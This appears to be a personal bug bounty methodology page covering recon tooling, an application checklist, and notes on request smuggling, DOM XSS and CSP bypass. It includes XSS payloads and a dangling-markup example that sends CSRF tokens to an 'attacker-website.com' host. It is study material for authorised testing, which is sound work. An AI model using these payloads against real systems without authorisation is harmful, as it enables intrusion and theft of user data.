---
layout: page
title: Bug Bounty Guide
permalink: /info
comments: false
---

<div class="row justify-content-between">
<div class="col-md-8 pr-5">

<p align="center">
  <img src="../assets/images/Hunting-for-Bugs.png" alt="bug-hunting" title="Bug Hunting" width="80%" />
</p>

</div>

<div class="col-md-4">

<div class="sticky-top sticky-top-80">
## Navigation

- [Recon Methodology](#information-gathering)
- [Application Checklist](#application-checklist)
- [Vulnerability Testing](#vulnerability-testing)
- [References](#references)

</div>
</div>
</div>

---

## Recon

#### Objectives:
- **Identify all subdomains!**
- **Identify all open ports!**
<br>

#### Information Gathering:
   - **Target Details:** Collect comprehensive data on the target, including potential acquisitions.
   - **Tool:** [Crunchbase](https://www.crunchbase.com) can be used to identify acquisitions related to the target.

#### ASN Identification:
   - **Manual Method:** Utilize [BGP HE](http://bgp.he.net) to find Autonomous System Numbers (ASNs).
   - **Automated Tools:**
     - **Metabigor:** An efficient tool for ASN reconnaissance.
     - **ASNLookup:** A straightforward ASN lookup utility.
     - **Amass Intel:** Use with `asn` flag for detailed ASN information (`amass intel -asn [ASN_NUMBER]`).

#### Root Domain Discovery:
   - **Reverse WHOIS:** Automate using DOMLink for domain linking based on WHOIS data.
   - **Ad/Analytics Relationships:** Explore relationships using [BuiltWith](https://builtwith.com) for Ad and Analytics identifiers.
   - **Google Dorks:** Utilize advanced Google search operators to find target domains.
   - **Shodan:** Employ Shodan for uncovering exposed services linked to your target.

#### Subdomain Enumeration

##### Linked and JS Discovery:
   - **Objective:** Identify all links and embedded JavaScript within client-side code.
   - **Tool:** 
     - **Burp Suite Pro:** Grab useful extensions for passive discovery: JS Miner. Conduct manual review as well.

##### Subdomain Scraping:
   - **Infrastructure Sources:** Gather data from sources like Censys, DnsDumpster, and WaybackMachine.
   - **Certificate Sources:** Explore SSL certificate registries like crt.sh, CertDB, and Cert Spotter.
   - **Search Engines:** Utilize Google, Yahoo, and Baidu for domain discovery.
   - **Security Databases:** Leverage databases like VirusTotal, Rapid7 Project Sonar, and SecurityTrails.

   - **Tools:**
     - **Amass and Subfinder:** Powerful tools for ASN enumeration and subdomain discovery. Need API keys for more results.
     - **Tool CMD:** ```amass enum -active -df domains.txt -o output.txt```
     - **GitHub Subdomain Scraping:** Use a script to scrape GitHub for subdomains.
     - **Shodan Parser:** Use a Shodan parer to obtain all results from Shodan.
     - **Cloud Range Monitoring:** Parse certificates to match with your target using tools like `tls.bufferover.run`.

##### Subdomain Bruteforcing:
   - **Tools:**
     - **Amass:** Command: `amass enum -brute -d [DOMAIN] -rf`
     - **ShuffleDNS:** A massDNS wrapper for effective subdomain brute-forcing.
     - **Wordlists:**
       - **Tailored Wordlists:** Generate using TomNomNom and CeWL. Use SecLists.
       - **Massive Wordlists:** Use comprehensive lists like JHaddix's `all.txt`.
     - **Commonspeak2:** Source wordlists from GitHub.
     - **Subdomain Alterations:** Experiment with variations like `www.target.com` to `ww2.target.com`.

#### Port Scanning:
   - **Masscan:** Quickly identify open ports (requires an IP list).
   - **dnMasscan:** Resolves domain names to IP addresses and passes them to Masscan.
   - **Nmap:** Perform a detailed analysis of discovered open ports.

#### GitHub Dorking:
   - **Objectives:**
     - Identify endpoints and subdomains.
     - Create custom wordlists based on discovered technologies.
     - Leverage naming conventions and patterns to discover hidden assets.
     - Use job postings to infer the technology stack.
   - **Search Tips:**
     - Filter by scripting languages using `language:python language:bash`.
     - Focus on recently submitted repositories.
     - Exclude unnecessary results using `NOT` keyword.
     - Identify users who may not be directly mapped to the organization by exploring dotfiles and LinkedIn profiles.

#### HTTPx and GoWitness:
   - Use **HTTPx** to find live hosts and maybe **Gowitness** (HTTPx can do both) to capture screenshots for visual inspection.
   - Workflow:
     1. Find live hosts
        - ```cat domains.txt | httpx -silent -o live_hosts.txt```
     3. Take screenshots of the live hosts
        - ```gowitness file -f live_hosts.txt --timeout 10```
     3. Serve the screenshots for inspection
       - ```cd gowitness```
       - ```python3 -m http.server 8080```


#### Subdomain Takeover:
   - **Resources:**
     - **SubOver:** Tool to check for vulnerable subdomains.
     - **Nuclei:** Run templates to check for takeover vulnerabilities.


[Back to top](#navigation)

---

## Application Checklist

<b>Ask yourself these questions during enumeration.</b>
<br>
1. What is the intended use of the application?
2. What technology stack and programming languages are used in the application?
4. What type of server or hosting environment is powering the application?
5. Is there a Web Application Firewall (WAF) in place?
6. What third-party libraries and frameworks are integrated? Are there known vulnerabilities associated with these?
7. What authentication mechanisms are implemented?
8. What objects or data structures are utilized within the application?
9. How are sessions created, maintained, and managed?
10. Are there any useful comments or metadata within the code?
11. How does the application handle special characters or input encoding?
12. Can specific actions or inputs trigger error messages or stack traces?
13. What common features or functionalities are included in the application?
14. How is a user uniquely identified and tracked?
15. Are there different user roles or permission levels within the application?
16. Does the application expose or utilize an API?
17. Is a Content Management System (CMS) integrated into the application?
18. Is a Content Security Policy (CSP) in place to mitigate cross-site scripting attacks?
19. Is Cross-Origin Resource Sharing (CORS) implemented, and how is it configured?
20. Is CAPTCHA or another bot detection mechanism used?
21. Are WebSockets or similar technologies employed for real-time communication?
22. Is the source code or any part of it publicly accessible?


[Back to top](#navigation)

---

## Vulnerability Testing

Note: Add more vuln specfic notes from OneNote

#### HTTP Request Smuggling

**Step 1:** Begin by right-clicking on the Fully Qualified Domain Name (FQDN) and selecting the "Smuggle Probe" option.  
**Step 2:** If the tool identifies a vulnerability, left-click on the "Issue" to delve deeper. Navigate to the "Request 1" tab and select either CL.TE or TE.CL, depending on the specific payload requirements.  
(If the vulnerability is detected across multiple directories, expand the paths and ensure you select the correct one.)  
**Step 3:** Adjust the prefix to match the necessary payload criteria.  
**Step 4:** Launch the attack.

#### Advanced XSS
- Cheat Sheet -- https://portswigger.net/web-security/cross-site-scripting/cheat-sheet

##### Three Types
- Reflected -- Malicious script comes from current HTTP Request
- Stored -- Malicous script comes from the application's database
- DOM -- Vulnerability exists in the client-side code

##### DOM-based XSS
- Vulnerable pages take user-controlled data (source) and pass it to a function that supports dynamic code execution (sink)
- Common Sources:
    `window.location (URL)`
    `location.search`
    `location.hash`
    `document.URL`
    `document.documentURI`
    `document.URLUnencoded`
    `document.baseURI`
    `location`
    `document.cookie`
    `document.referrer`
    `window.name`
    `history.pushState`
    `history.replaceState`
    `localStorage`
    `sessionStorage`
    `IndexedDB (mozIndexedDB, webkitIndexedDB, msIndexedDB)`
    `Database`
- Common Sinks:
    `document.write()`
      - Works with <script>
    `document.writeln()`
    `document.domain`
    `someDOMElement.innerHTML`
      - Works with <img> or <iframe>
    `someDOMElement.outerHTML`
    `someDOMElement.insertAdjacentHTML`
    `someDOMElement.onevent`
    `add()`
    `after()`
    `append()`
    `animate()`
    `attr()`
      - Works with HTML tags that can use the href attribute
      - Example: Set return URL to javascript:alert('XSS')
    `insertAfter()`
    `insertBefore()`
    `before()`
    `html()`
    `prepend()`
    `replaceAll()`
    `replaceWith()`
    `wrap()`
    `wrapInner()`
    `wrapAll()`
    `has()`
    `constructor()`
    `init()`
    `index()`
    `jQuery.parseHTML()`
    `$.parseHTML()`
- Testing for Sinks:
    ~ HTML Sinks -- Easy
        1. Send MD5 sum through the source
        2. Search HTML in Dev Tools for MD5 sum (Ctrl + F)
        3. Refine payload to deliver attack
    - JavaScript Execution Sinks -- Hard
        1. Search JavaScript code for any sources being referenced (Ctrl + Shift + F)
        2. Add breakpoints and manually follow how the source's value is being used
        3. If source's value is assigned to a variable, search for how that variable is used
        4. If that variable is passed to a sink, hover over the variable to show it's value before it's passed to the sink
        5. Refine payload to deliver attack
- Angular
    - Look for the "ng-app" attribute
    - All JavaScript enclosed in the HTML tags labelled ng-app will be run automatically by Angular
    Payload: `{{$on.constructor('alert(1)')()}}`
- When JavaScript eval() method evaluates a JSON object
    Payload: `\"-alert(1)}//`

##### Contexts
- Between HTML tags
    EX: <p>[USER CONTROLLED INPUT]</p>
    - Attacker must introduce new HTML tags to trigger JavaScript
    Step 1: Fuzz for HTML tags filtered by WAF
    Step 2: Fuzz for attributes/events filtered by WAF
    Step 3: Fuzz for payloads filtered by WAF
    Step 4: Build working payload based on whitelisted tag, attr, and payload

##### Bypassing Content Security Policy (CSP)

Common CSP Controls:
    - Content-Security-Policy Header:
        - script-src 'self' -- Only scripts from the same origin domain can be loaded
        - script-src https://scripts.normal-website.com -- Only scripts from a specific domain can be loaded
    - Nonce (random value):
        - Same value must be used in the script tag, otherwise the script won't execute
        - Must be securely generated each time the page loads
        - Must not be guessable
    - Hash (hash value of script being loaded)
        - Script will not load if it is changed since the hash will no longer match
- Most CSPs don't block <img> tags 
- Dangling Markup Injection can be used to bypass CSP
    - Inject HTML tags with open attr quotes so sensitive data (CSRF Token) is sent to attacker's server
    Step 1: Identify name of input field to exploit
    Step 2: Add GET parameter in URL with corresponding name
    Step 3: Value of malicious parameter will be the payload
    **IMPORTANT NOTES**
    - Send request through Repeater, then "Show Response in Browser"
    - Single vs Double quote is VERY important.  Double quote will end on next double quote and vice-versa
    EX:
       ```<input type="text" name="input" value="[PAYLOAD]"/>```
        ```[PAYLOAD] = "><img src='//attacker-website.com?```
        ```Resulting HTML: <input type="text" name="input" value=""><img src='//attacker-website.com?[SENSITIVE DATA]"/>```

[Back to top](#navigation)

---

## References

[OWASP Top 10](https://owasp.org/www-project-top-ten/)

[Back to top](#navigation)

---
